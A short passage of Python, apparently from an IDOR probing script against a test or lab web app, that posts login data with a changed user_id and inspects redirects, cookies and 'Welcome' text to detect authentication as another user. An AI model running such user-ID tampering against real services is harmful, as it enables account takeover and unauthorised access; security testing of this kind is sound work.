        'username': 'test',  # Keep username same
        'user_id': str(uid),  # Change user_id
        'password': 'test'
    }
    resp = requests.post(f"{base_url}/password/test", data=data, headers=headers)
    
    # Check for session cookie in response (new session = successful auth as different user)
    if resp.history and resp.cookies:
        print(f"\n[!] Possible IDOR at user_id={uid}")
        print(f"    Redirect chain: {[r.status_code for r in resp.history]}")
        print(f"    Final URL: {resp.url}")
        print(f"    Cookies: {dict(resp.cookies)}")
    
    # Check response for user indicator
    name_match = re.findall(r'Welcome, ([^.!]+)', resp.text)
    uid_match = re.findall(r'name="user_id".*?value="(\d+)"', resp.text)
    
    if name_match and uid_match:
